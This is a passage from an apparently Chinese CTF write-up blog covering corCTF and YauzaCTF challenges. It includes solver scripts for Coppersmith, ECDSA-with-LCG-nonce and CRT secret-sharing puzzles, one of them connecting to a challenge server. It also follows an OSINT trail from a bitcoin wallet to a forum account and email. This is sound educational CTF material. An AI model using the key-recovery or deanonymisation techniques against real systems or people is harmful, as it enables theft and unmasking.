class="line">Fp = Zmod(p)</span><br><span class="line">bar, x, c2 = <span class="built_in">map</span>(Fp, [bar, x, c2])</span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line">f = x * (bar + k0) + bar + k1 - c2</span><br><span class="line"><span class="comment"># m = 2</span></span><br><span class="line">roots = small_roots(f, (<span class="number">2</span>^<span class="number">200</span>, <span class="number">2</span>^<span class="number">200</span>), m=<span class="number">1</span>, d=<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">k0, k1 = roots</span><br><span class="line"></span><br><span class="line">a = bar + k0</span><br><span class="line">b = bar + k1</span><br><span class="line">key = sha256(long_to_bytes(a) + long_to_bytes(b)).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(unpad(cipher.decrypt(ct), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<p>出来的挺奇怪的，但有flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906164927922.png" alt="image-20210906164927922"></p>
<blockquote>
<p>corctf{c0ngr4tul4t10ns_y0u_4r3_n0w_p4rt_0f_th3_d3fund_f4n_club!}</p>
</blockquote>
<p>decode一下，这个头像是啥寓意，评论区有师傅告诉我吗；defund是实现了Copper的github库的主人</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906170222706.png" alt="image-20210906170222706"></p>
<p>我也是defund师傅的小迷弟了</p>
<h2 id="Crypto-LCG-k（unsolved）"><a href="#Crypto-LCG-k（unsolved）" class="headerlink" title="Crypto-LCG_k（unsolved）"></a>Crypto-LCG_k（unsolved）</h2><p>对<a href="https://lazzzaro.github.io/2020/11/07/crypto-ECC/">ECDSA</a>没有了解过，做到一半发现求不出来d，搜了发现是椭圆曲线签名，找了la佬和<a href="https://www.sebven.com/ctf/2021/08/23/corCTF2021-LCG_k.html">一位师傅的WP</a>去学习了下</p>
<hr>
<p>LCG？Hey everybody在你头上暴扣</p>
<blockquote>
<p>Can you sign my message for me?</p>
<p>nc crypto.be.ax 6002</p>
</blockquote>
<p>首先我们来看最后的<code>verify</code>部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;now, i want you to sign my message.&#x27;</span>)</span><br><span class="line">r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me r&gt;&#x27;</span>))</span><br><span class="line">s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me s&gt;&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> verify(r, s, mymsg):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;nice. i&#x27;ll give you the flag.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;no, that&#x27;s wrong.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>想要verify成功，获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">r, s, m</span>):</span></span><br><span class="line">	v1 = H(m)*inverse(s, N) % N</span><br><span class="line">	v2 = r*inverse(s, N) % N</span><br><span class="line">	V = v1*G + v2*pub</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(V.x) % N == r</span><br></pre></td></tr></table></figure>

<p>总结一下就是输入r和s，其他的我们都知道，使得该式子成立<br>$$<br>ms^{-1}x+rs^{-1}xd\equiv _nr<br>$$<br>而第一层呢，既是hint，也是我们必须通过的关卡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;give me something to sign, in hex&gt;&#x27;</span>))</span><br><span class="line">	h = H(m)</span><br><span class="line">	<span class="keyword">if</span> m == mymsg <span class="keyword">or</span> h <span class="keyword">in</span> signed_hashes:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;i won&#x27;t sign that.&quot;</span>)</span><br><span class="line">		exit()</span><br><span class="line">	signed_hashes.append(h)</span><br><span class="line">	r, s = sign(m)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;r:&#x27;</span>, <span class="built_in">str</span>(r))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;s:&#x27;</span>, <span class="built_in">str</span>(s))</span><br></pre></td></tr></table></figure>

<p>看下具体签名的过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">m</span>):</span></span><br><span class="line">	k = <span class="built_in">next</span>(gen)</span><br><span class="line">	r = <span class="built_in">int</span>((k*G).x) % N</span><br><span class="line">	s = ((H(m) + d*r)*inverse(k, N)) % N</span><br><span class="line">	<span class="keyword">return</span> r, s</span><br></pre></td></tr></table></figure>

<p>$$<br>r=kx\ mod\ n<br>$$<br>$$<br>s=(m+rd)\cdot k^{-1}\ mod\ n<br>$$</p>
<p>LCG已知模数还可以知道四个状态，可爆</p>
<p>所以应该前面两个状态是用来得到乘数和增量，然后emmmmm似乎求出来LCG也没用，因为不需要预测随机数，而且每次k都可以通过r来算到；所以直接求d吧</p>
<p>我以为的求d<br>$$<br>(sk-m)\cdot r^{-1}\equiv_n d<br>$$<br>不是$d\in [0,\ n)$吗，左边求出来的不就是d吗，但是操作过后确实不是，暂时不理解；有师傅可以评论区告诉我吗</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc crypto.be.ax 6002</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, inverse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;crypto.be.ax&#x27;</span>, <span class="number">6002</span>)</span><br><span class="line">G = P256.G</span><br><span class="line">N = P256.q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span>(<span class="params">m</span>):</span></span><br><span class="line">	h = sha256()</span><br><span class="line">	h.update(m)</span><br><span class="line">	<span class="keyword">return</span> bytes_to_long(h.digest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">	g, x, y = egcd(a, m)</span><br><span class="line">	<span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span>(<span class="params">states, m, a</span>):</span></span><br><span class="line">	b = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * a) % m</span><br><span class="line">	<span class="keyword">return</span> m, a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span>(<span class="params">states, m</span>):</span></span><br><span class="line">	a = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], m) % m</span><br><span class="line">	<span class="keyword">return</span> crack_unknown_increment(states, m, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># LCG part</span></span><br><span class="line">sequence = []</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	inv = invert(G.x, N)</span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;give me something to sign, in hex&gt;&#x27;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(m).encode().<span class="built_in">hex</span>())</span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;r:&#x27;</span>)</span><br><span class="line">	r = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;s:&#x27;</span>)</span><br><span class="line">	s = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">	k = (<span class="built_in">int</span>(r) * <span class="built_in">int</span>(inv)) % N</span><br><span class="line">	d = ((<span class="built_in">int</span>(s) * k - H(<span class="built_in">str</span>(m).encode())) * <span class="built_in">int</span>(invert(<span class="built_in">int</span>(r), N))) % N</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;d =&#x27;</span>, d)</span><br><span class="line"><span class="comment"># d = 111794286037145166785531145837405642417111081891011940999958121590200481323527</span></span><br><span class="line"><span class="comment"># d = 32439466539999346636384702841656953540974828530354787685779441994658571451022</span></span><br><span class="line"><span class="comment"># d = 10926244771926014704519302388552973799549625394927395188718476150973064437377</span></span><br><span class="line"><span class="comment"># d = 114762443346016561170498759027815574796335775581660017547791545655526389133816</span></span><br></pre></td></tr></table></figure>

<hr>
<p>师傅说是椭圆曲线数字签名算法，尝试从标准的密码系统上找这里的漏洞</p>
<p>开学了，事情比较多，还是一样的烦心，呵，有空再回来整理了</p>
<h1 id="YauzaCTF"><a href="#YauzaCTF" class="headerlink" title="YauzaCTF"></a>YauzaCTF</h1><p>战斗民族的比赛，密码题略少，网站开得了，但是文件下载很慢，但我的网还是在努力下载了，为了我的复现</p>
<p>OSINT主要是看到TIME上的WP，这个方向也挺好玩的，所以想跟着<a href="https://kashmir54.github.io/ctfs/YauzaCTF2021/#get-in-touch">果歪的师傅</a>复现下这两道题，也是看下OSINT手一般会用哪些工具</p>
<h2 id="Crypto-Sharing-secrets"><a href="#Crypto-Sharing-secrets" class="headerlink" title="Crypto-Sharing secrets"></a>Crypto-Sharing secrets</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> storage <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">x</span>):</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        m *= i</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">    count = <span class="number">25</span></span><br><span class="line">    threshold = <span class="number">11</span></span><br><span class="line">    psize = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    primes = <span class="built_in">list</span>(<span class="built_in">sorted</span>(getPrime(psize) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count)))</span><br><span class="line"></span><br><span class="line">    pmin = mul(primes[-threshold + <span class="number">1</span>:])</span><br><span class="line">    pmax = mul(primes[:threshold])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> pmin &lt; flag &lt; pmax</span><br><span class="line"></span><br><span class="line">    shadows = [flag % x <span class="keyword">for</span> x <span class="keyword">in</span> primes]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secrets.json&#x27;</span>, <span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">        out_file.write(json.dumps(&#123;</span><br><span class="line">            <span class="string">&#x27;shadows&#x27;</span>: shadows[<span class="number">1</span>:threshold],</span><br><span class="line">            <span class="string">&#x27;primes&#x27;</span>: primes[:threshold],</span><br><span class="line">            <span class="string">&#x27;threshold&#x27;</span>: threshold</span><br><span class="line">        &#125;))</span><br></pre></td></tr></table></figure>

<p>中国剩余定理模数不够，稍微爆破就出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">shadows = [<span class="number">7832917</span>, <span class="number">8395798</span>, <span class="number">4599919</span>, <span class="number">154544</span>, <span class="number">3430534</span>, <span class="number">4694683</span>, <span class="number">123690</span>, <span class="number">5911445</span>, <span class="number">7380167</span>, <span class="number">10597668</span>]</span><br><span class="line">primes = [<span class="number">8412883</span>, <span class="number">8889941</span>, <span class="number">9251479</span>, <span class="number">9471269</span>, <span class="number">9503671</span>, <span class="number">9723401</span>, <span class="number">10092149</span>, <span class="number">10389901</span>, <span class="number">10551241</span>, <span class="number">10665527</span>, <span class="number">11099951</span>]</span><br><span class="line">threshold = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">x</span>):</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        m *= i</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_m = crt(shadows, primes[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000000</span>):</span><br><span class="line">    mi = fake_m + mul(primes[<span class="number">1</span>:]) * j</span><br><span class="line">    flag = long_to_bytes(mi)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;YauzaCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>YauzaCTF{k33p_1t_1n_7h3_sh4d0w5}</p>
</blockquote>
<h2 id="Crypto-Knapsack（unsolved）"><a href="#Crypto-Knapsack（unsolved）" class="headerlink" title="Crypto-Knapsack（unsolved）"></a>Crypto-Knapsack（unsolved）</h2><p><a href="https://blog.csdn.net/m0_49109277/article/details/120085932?spm=1001.2014.3001.5501">背包</a>，为什么我没有在遇到WM之前遇到这道题</p>
<p>只给了flag和pubkey，应该和WM的checkin大同小异，flag是加密后得到的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">12777998288638</span>, <span class="number">10593582832873</span>, <span class="number">7834439533378</span>, <span class="number">10486500991495</span>, <span class="number">14714582460036</span>, <span class="number">7568907598905</span>, <span class="number">12800035735033</span>, <span class="number">14724457772647</span>, <span class="number">11910445040159</span>, <span class="number">11202963622894</span>, <span class="number">10291238568620</span>, <span class="number">15103559399914</span>, <span class="number">13156142631772</span>, <span class="number">16988824411176</span>]</span><br><span class="line">pubkey = [<span class="number">2948549611747</span>, <span class="number">2043155587142</span>, <span class="number">361533419625</span>, <span class="number">1001380428657</span>, <span class="number">2438250374319</span>, <span class="number">1059738568330</span>, <span class="number">115120002311</span>, <span class="number">198226659880</span>, <span class="number">2343897184958</span>, <span class="number">2592576935132</span>, <span class="number">2327834076450</span>, <span class="number">237536244289</span>, <span class="number">309228208827</span>, <span class="number">3327276767693</span>, <span class="number">462372704541</span>, <span class="number">2176574227058</span>]</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<blockquote>
<p>I decided to keep the secret in my knapsack, so it’s safer.</p>
</blockquote>
<p>用WM的脚本跑出来这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = [<span class="number">34458</span>, <span class="number">24238</span>, <span class="number">49798</span>, <span class="number">25130</span>, <span class="number">14046</span>, <span class="number">11468</span>, <span class="number">40662</span>, <span class="number">55034</span>, <span class="number">11382</span>, <span class="number">52750</span>, <span class="number">54828</span>, <span class="number">9978</span>, <span class="number">46636</span>, <span class="number">48758</span>]</span><br></pre></td></tr></table></figure>

<p>然后就没想到了；看这出题量是简单题啊，没道理啊，WM白复现了</p>
<h2 id="OSINT-Stolen-Capitalism（unsolved）"><a href="#OSINT-Stolen-Capitalism（unsolved）" class="headerlink" title="OSINT-Stolen Capitalism（unsolved）"></a>OSINT-Stolen Capitalism（unsolved）</h2><blockquote>
<p><strong>English</strong> Someone stole bitcoins from the wallet of our Party<br><code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>.</p>
<p>Find the real name of the thief. The flag matches the specified format.</p>
</blockquote>
<p>偷了比特币，找出小偷的真实姓名</p>
<hr>
<p>稍微去了解了下比特币是什么，随便找了几个视频看了下</p>
<p>比特币是一种数字货币（现在大约有4000多种数字货币，比特币占56%），单位BTC，可以精确到小数点后面很多位；有很多网站和app是用来做比特币交易的</p>
<p>题目中给的这一串<code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>就是某人的<code>bitcoin address</code>，一个人可以拥有多个<code>bitcoin address</code>，由算法生成独一无二的<code>bitcoin address</code>；它的用法有点像支付宝的收款码</p>
<p>重点来了，比特币的每一笔交易都会记录起来，而记录的手段就是著名的区块链，<strong>去中心化</strong>是其一个基本的思想，每十分钟都会产生一个新的区块链记录这段时间之内发生的交易；这个链子包含从比特币开始到现在的所有记录。然后有一个很魔性的东西，到底是区块链呢，<code>区块链就是比特币，比特币就是区块链</code>。一个区块链里面<strong>50</strong>个比特币。</p>
<p>更重点的来了。那么区块链由谁来记录呢？首先肯定是要有人来记录的，来维持整个系统。而做这项工作的人的回报就是比特币。这些人被称为<code>bitcoin miner</code>，也就是挖矿。显然挖比特币的成本就是你的电脑和算力，越多人挖，就越难挖到，也就让比特币的价值变得更高，因为花原来相同的时间挖到比特币的少了</p>
<p>比特币有一个优点，就是不会随着比特币的数量增多而贬值，因为每过四年，一个区块链里的比特币就会减少一半；所以显然，就像黄金一样，比特币是有限的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905143832950.png" alt="image-20210905143832950"></p>
<p>一些有助于理解的细节</p>
<ul>
<li>每十分钟产生的区块有1M大小，记录约4000条交易信息</li>
<li>需要解决几个问题：<ol>
<li><strong>为何记账</strong>：因为有手续续费（由转出方支付），有<strong>打包奖励</strong></li>
<li><strong>以谁为准</strong>：每个包只能由一个人来打，谁能给出<strong>工作量证明</strong>谁就能打包；而这个就理解成一个要通过计算机枚举才能解出的数学题吧；这也就是上面说的挖矿了，这相当于比特币的扩散手段</li>
<li>挖矿的原理：<code>HASH=SHA256(SHA256(每人都一样的头部信息+每个人各自收集到的账单+时间戳+随机数))</code>，要求HASH值的二进制数前n位是0，因此目前来说只能爆破随机数；为了匹配当前所有矿机的算力，n一般设置为66，<em>当然这可以推导</em></li>
<li>身份认证以及双重支付、篡改等问题，用到密码学、区块链追溯、消息放弃，最长链原则等</li>
</ol>
</li>
</ul>
<hr>
<p>开始整活</p>
<p>那么显然我党的钱包地址<code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>有转出，由于区块链的广播公开，网上肯定可以转出的信息</p>
<p>直接搜有点看不懂，可以用<a href="https://www.blockchain.com/btc/address/bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt">页面更好一点的</a>，这里有每一账户所有的交易信息</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905170035485.png" alt="image-20210905170035485"></p>
<p>只有两条可以看到18号<br><code>bc1q27u4g7svl4adwqzp2ds6g6gapph4azpvxj69wm</code>转给<br><code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>0.00048209BTC，在23号<br><code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>又向<br><code>bc1q0lpcsvr6p2lg0wrmwge548x0yau943n9vljzsr</code>转了这笔钱</p>
<p>显然<code>bc1q0lpcsvr6p2lg0wrmwge548x0yau943n9vljzsr</code>就是我们下一步追踪的线索</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905170840050.png" alt="image-20210905170840050"></p>
<p>接着又是只有唯一的支出<code>bc1qcrf4najrlj6pwynxhywlp3h3qzazvthrdp5ta3</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905172341869.png" alt="image-20210905172341869"></p>
<p>接着是给两个账户转账：<br><code>bc1qeaxw4s92ajf939z280rmycq2vw39scvqv573yu</code>和<code>bc1qz3n89hjq4rrlzsna3pdrygslum7v4slf8qpm8h</code></p>
<p>可以验证，到此为止，这笔钱在到了最后这两个账户后就没有转出记录了</p>
<p>那这四个中，谁是小偷呢？</p>
<blockquote>
<p>bc1q0lpcsvr6p2lg0wrmwge548x0yau943n9vljzsr</p>
<p>bc1qcrf4najrlj6pwynxhywlp3h3qzazvthrdp5ta3</p>
<p>bc1qeaxw4s92ajf939z280rmycq2vw39scvqv573yu</p>
<p>bc1qz3n89hjq4rrlzsna3pdrygslum7v4slf8qpm8h</p>
</blockquote>
<p>我们用搜索引擎合理搜索，出了关于<code>bitcoin address</code>有关的信息外，在四个中，只有<code>bc1qz3n89hjq4rrlzsna3pdrygslum7v4slf8qpm8h</code>会出来一条特别的信息<br><a href="https://antichat.com/members/413903/">https://antichat.com/members/413903/</a></p>
<p>是一个匿名聊天的平台，可以搜到这位id为<code>Tovarishch</code>的一些信息，这里的捐赠就是我们上面找到的比特币地址</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905173855411.png" alt="image-20210905173855411"></p>
<p>除此之外还能看到一个protonmail邮箱<code>tovarishch123@protonmail.com</code>，师傅说可以用ProtOSINT 去获取更多信息</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905180028573.png" alt="image-20210905180028573"></p>
<p>看到公钥文件是PGP的公钥。Pretty Good Privacy (PGP) 是一种加密系统，用于发送加密电子邮件和加密敏感文件；从创建的日期看也是为了比赛而创建的，方向应该没错</p>
<p>我试过用<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event">keyserver</a>搜索</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905182701244.png" alt="image-20210905182701244"></p>
<p>也和用师傅所说的Kleopatra去看了下，反正就是没有的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905183433438.png" alt="image-20210905183433438"></p>
<p>我尝试直接用搜索引擎去搜索，在StopForumSpam一个阻止机器人垃圾邮件的论坛上，搜到了该邮箱的踪影</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905184242169.png" alt="image-20210905184242169"></p>
<p>同一个ip地址下有这两封邮件</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905184820552.png" alt="image-20210905184820552"></p>
<p>但用户名提交都不对</p>
<p>没事，那个匿名聊天平台还有别的信息，总共有两篇帖子，这个翻译。。</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905190311365.png" alt="image-20210905190311365"></p>
<p>师傅说是<code>Reliable mixers Msg: Recommend a good proven bitcoin mixer Msg (rusky)</code>，和比特币混合器有关，反正就是龟孙没跑了</p>
<p>另外一篇是转发<a href="https://www.youtube.com/watch?v=DMoCM_FgLP8">YouTube上的视频</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905190941131.png" alt="image-20210905190941131"></p>
<p>这个条评论确实可疑</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905194152477.png" alt="image-20210905194152477"></p>
<p>然后剩下是师傅整理的一些时间节点</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905194255161.png" alt="image-20210905194255161"></p>
<p>感觉前面都挺顺利和确定的，但是从这个视频开始，一切就不确定起来</p>
<p>专业的师傅不会，业余的我更不会了哈哈哈哈，虽然这道题比下一道出的更多</p>
<h2 id="OSINT-Get-in-touch（recuring）"><a href="#OSINT-Get-in-touch（recuring）" class="headerlink" title="OSINT-Get in touch（recuring）"></a>OSINT-Get in touch（recuring）</h2><blockquote>
<p><strong>English</strong>: Our best agent is going to send us a message from an enemy country. But instead, he just posted some stupid player on his page! Find his public key immediately and send us the first 42 symbols in an appropriate form so we can be sure it’s him. For example, YAUZActf{Tgj8t6gbK9zlv4Xmivyhttjzvfbbp7nuqkce3uuomF}</p>
<p><code>tasks.yauzactf.com:30010</code></p>
</blockquote>
<p>提供的是网址，我还以为nc；浏览器打开之后，有几个YouTube的视频</p>
<p>可以看一下网页源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.plyr.io/3.6.8/plyr.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.plyr.io/3.6.8/plyr.polyfilled.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hidden</span> <span class="attr">class</span>=<span class="string">&quot;plyr__video-embed&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/DMoCM_FgLP8&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowtransparency</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allow</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hidden</span> <span class="attr">class</span>=<span class="string">&quot;plyr__video-embed&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/Bwf9f498Yqs&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowtransparency</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allow</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hidden</span> <span class="attr">class</span>=<span class="string">&quot;plyr__video-embed&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/o2mD5hv0eMc&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowtransparency</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allow</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> 